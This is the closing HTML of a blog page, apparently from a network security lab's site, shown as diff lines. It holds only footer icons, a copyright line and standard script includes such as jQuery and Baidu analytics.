+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
